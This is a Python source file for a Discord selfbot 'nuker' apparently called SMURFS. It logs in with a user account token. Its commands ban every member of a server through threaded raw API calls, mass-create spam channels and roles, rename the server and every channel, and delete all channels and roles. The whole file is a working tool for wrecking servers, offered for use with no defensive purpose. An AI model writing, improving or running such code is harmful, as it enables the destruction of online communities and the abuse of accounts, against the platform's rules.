import asyncio
from multiprocessing.connection import Client
from re import L
from tokenize import group
from unicodedata import name

import discord
import requests
from discord.ext import commands
import os
import getpass 
import time
import threading
import json
from datetime import datetime
import requests
from concurrent.futures import ThreadPoolExecutor
from json import loads, dumps, load
import random, discord, threading, os, datetime, asyncio
from time import sleep
from colorama import Fore
from discord.ext import (
    commands,
)

import subprocess
import requests
import time
import sys
import os
import fade

os.system('cls')
os.system(f"title SMURFS DISCORD")
with open('config.json') as f:
    config = json.load(f)
async def on_message(message):

    await client.process_commands(message)

async def clr(ctx,help=""):
    await ctx.message.delete()
    time.sleep(0.1)

    if help.lower() == "help":
        embed = discord.Embed(title="Clear help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Clear", inline=False)
        embed.add_field(name="Description", value="Clears console", inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

    os.system("cls")
async def on_ready():
    os.system("mode con: cols=120 lines=27 ")
    os.system(f"title SMURFS DISCORD")

ErrorLog = "\x1b[31;1m[\x1b[37;1m-\x1b[31;1m]\x1b[37;1m"


intents = discord.Intents.all()
intents.members = True

global token
global prefix

token = ""
prefix = ""
color = 0x003240
under = "\n\n\n\n\n\n"
space = "                          "

global memberLIST
global channelLIST
global roleLIST

global roleCount
global channelCount
global memberCount
global spamMessage
global purgeMessage
spamMessage = True
purgeMessage = True

with open("config.json") as file:
    data = json.load(file)
prefix = data["prefix"]
token = data["token"]
headers = {'Authorization': f'{token}'}


i = 0
runn = True
executor = ThreadPoolExecutor(max_workers=int(100000))

intents = discord.Intents.default()
intents.presences = True
intents.members = True
bot = discord.Client()
bot = commands.Bot(
    description='Selfbot',
    command_prefix=prefix,
    self_bot=True
)    

bot.remove_command('help')

text = """
    ███████╗███╗   ███╗██╗   ██╗██████╗ ███████╗███████╗
    ██╔════╝████╗ ████║██║   ██║██╔══██╗██╔════╝██╔════╝ CREDIT : Smurfs#5555
    ███████╗██╔████╔██║██║   ██║██████╔╝█████╗  ███████╗ GITHUB : https://github.com/Smurfsx
    ╚════██║██║╚██╔╝██║██║   ██║██╔══██╗██╔══╝  ╚════██║
    ███████║██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ███████║
    ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝

    [+] !banall [guild id]
    [+] !smcc [amount name]
    [+] !smnch [name]
    [+] !smsvname [name]
    [+] !smdel
    [+] !smdt [name]
"""     
faded_text = fade.greenblue(text)
print(faded_text)

def get_prefix(client,message):
    with open("config.json") as file:
        data = json.load(file)
    prefix = data["prefix"]

    return prefix

client = commands.Bot(command_prefix=get_prefix, case_insensitive=True, intents=intents, self_bot=True)
client.remove_command("help")

prefix = get_prefix("","")

def ban(guild,member):
    try:

        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:

                print(f"\u001b[35m[{now()}]\u001b[34;1m[!] \u001b[37mrate_limited")

                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"\u001b[32m[\u001b[34mSmufsx\u001b[32m] \u001b[31;1mBanned\u001b[37m: \u001b[31m[\u001b[37m{member}\u001b[31m]")
                    
                    break
                else:
                    print(f"\u001b[31;1m[\u001b[32mSmufsx Banned\u001b[31;1m]")
                    break
    except:
        pass

def load():
    global token
    global prefix

    if prefix == "":
        prefix = input("\x1b[35;1m< \x1b[37;1mPrefix: ")
        jsonDATA = {"prefix": prefix, "token": token}
        with open("config.json", "w") as f:
            json.dump(jsonDATA,f,indent=4)
        print("Restart")
        time.sleep(5)
        exit()


    if token == "":
        print(" You haven't entered a token in Config.json")
        print(" please past token ↓↓↓↓")
        token = input("\x1b[35;1m< \x1b[37;1mToken: ")
        jsonDATA = {"prefix": prefix, "token": token}
        with open("config.json", "w") as f:
            json.dump(jsonDATA, f,indent=4)
        print("Restart")
        time.sleep(5)
        exit()
    else:
        login()

def login():
    global token
    global prefix

    try:

        client.run(token,bot=False)

    except:
        print(f"{ErrorLog} Invalid token {ErrorLog}")
        time.sleep(2)
        exit()

def now():
    now = datetime.now()
    nownow = now.strftime("%H:%M:%S")
    return nownow

def console_log_error(message):
    print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[31;1mERROR\x1b[30;1m]\x1b[30;1m•\x1b[37;1m{message}")




async def scraper(guildID):
    global memberLIST
    global channelLIST
    global roleLIST

    global roleCount
    global channelCount
    global memberCount

    guildOBJ = client.get_guild(int(guildID))
    members = await guildOBJ.chunk()

    memberLIST = []
    channelLIST = []
    roleLIST = []

    roleCount = 0
    channelCount = 0
    memberCount = 0

    for member in members:
        memberCount += 1
        memberLIST.append(member.id)

    for role in guildOBJ.roles:
        roleCount += 1
        roleLIST.append(role.id)

    for channel in guildOBJ.channels:
        channelCount += 1
        channelLIST.append(channel.id)


@client.event

  
@client.event
async def on_message(message):

    await client.process_commands(message)

@client.command() #Gen
async def clr(ctx,help=""):
    await ctx.message.delete()
    time.sleep(0.1)

    if help.lower() == "help":
        embed = discord.Embed(title="Clear help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Clear", inline=False)
        embed.add_field(name="Description", value="Clears console", inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

    os.system("cls")
  

@client.command() #Mal
async def banall(ctx,guildID="help"):
    await ctx.message.delete()
    time.sleep(0.1)
    if guildID.lower() == "help":
        embed = discord.Embed(title="Ban all help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**banall (**GUILD ID**)",inline=False)
        embed.add_field(name="Guild id",value="You can get guild id by enabling developer then right click the server name in the top left and click `Copy ID`",inline=False)

        embed.add_field(name="Description", value="Bans all members", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return
    try:
        await scraper(guildID)
        for i in memberLIST:
            threading.Thread(target=ban,args=(guildID,i)).start()
    except:
        console_log_error("Invalid guild id")
        pass

def textcspam(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.post(f"https://canary.discord.com/api/v8/guilds/{guild}/channels",headers=headers,json={"type":"0","name":nameofchan})
        print(f"\u001b[32m[\u001b[34mSmufsx\u001b[32m] \u001b[31;1mspamchannels\u001b[37m: \u001b[31m[\u001b[37m{guild}\u001b[31m]")
    except:
        pass

@client.command()
async def smcc(ctx,amount=None,*,nameofthem=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target = textcspam, args = (ctx.guild.id,nameofthem,)).start()

def spamname(chanid, name):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*', 'content-type': 'application/json'}
        requests.patch(f"https://discord.com/api/v9/channels/{chanid}", headers=headers, json={"name": name})
    except:
        pass

@client.command()
async def smnch(ctx, name):
    await ctx.message.delete()
    for chan in ctx.guild.channels:
        try:
            threading.Thread(target = spamname, args = (chan.id,name)).start()
        except:
            pass
@client.command()
async def smsvname(ctx, *, names):
    await ctx.message.delete()
    await ctx.guild.edit(
            name=names,
            description="Smufsx",
            reason="Smufsx",
            icon=None,
            banner=None
        )  
def deletechannel(channeldetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://canary.discord.com/api/v8/channels/{channeldetails}",headers=headers)
    except:
        pass
    print(f"\u001b[32m[\u001b[34mSmufsx\u001b[32m] \u001b[31;1mdeletechanals\u001b[37m: \u001b[31m[\u001b[37m{channeldetails}\u001b[31m]")

@client.command()
async def smdel(ctx):
    await ctx.message.delete()
    for chan in ctx.guild.channels:
        try:
            threading.Thread(target = deletechannel, args = (chan.id,)).start() 
        except:
            pass

def spamrole(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        randcolor = random.randint(0x000000, 0xFFFFFF)
        requests.post(f"https://discord.com/api/v8/guilds/{guild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":randcolor,"mentionable":"true"})
        print(f"\u001b[32m[\u001b[34mSmufsx\u001b[32m] \u001b[32mspamrole\u001b[37m: \u001b[31m[\u001b[37m{guild}\u001b[31m]")
    except:
        pass
    
def deleterole(guild,roledetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{roledetails}",headers=headers)
        print(f"\u001b[32m[\u001b[34mSmufsx\u001b[32m] \u001b[32mdeleterole\u001b[37m: \u001b[31m[\u001b[37m{guild}\u001b[31m]")
    except:
        pass


@client.command()
async def smdt(ctx, amount, *, roname):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            threading.Thread(target = deletechannel, args = (channel.id,)).start() 
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            threading.Thread(target = deleterole, args = (ctx.guild.id,role.id,)).start()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=roname,
            description="",
            reason="",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(int(amount)):
        threading.Thread(target = textcspam, args = (ctx.guild.id,roname,)).start()
    for _i in range(int(amount)):
        threading.Thread(target = spamrole, args = (ctx.guild.id,roname,)).start()
load()











